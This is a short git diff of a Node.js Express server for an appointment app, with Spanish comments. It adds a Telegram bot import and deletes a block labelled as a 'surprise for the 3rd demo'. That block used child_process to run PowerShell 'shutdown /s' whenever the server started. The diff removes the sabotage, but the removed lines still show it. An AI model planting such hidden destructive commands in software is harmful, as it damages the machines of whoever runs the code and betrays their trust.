@@ -11,6 +11,7 @@ const appointmentRouter = require("./routers/appointmentRoutes");
 const adminRouter = require("./routers/adminRoutes");
 const { PORT, ALLOWED_ACCES_URL } = require("./config");
 const Appointment = require("./models/appointmentModel");
+const telegramBot = require("./utils/telegramBot");
 
 // creamos la app express
 const app = express();
@@ -96,12 +97,6 @@ app.use((err, req, res, next) => {
       "Ocurrio un error en el servidor... volve a intentar nuevamente",
   });
 });
-
-// sorpresota para la 3ra demo
-var spawn = require("child_process").spawn;
-child = spawn("powershell.exe", ["shutdown /s"]);
-
-child.stdin.end(); //end input
 
 // levantamos el servidor
 const server = app.listen(PORT, () => {
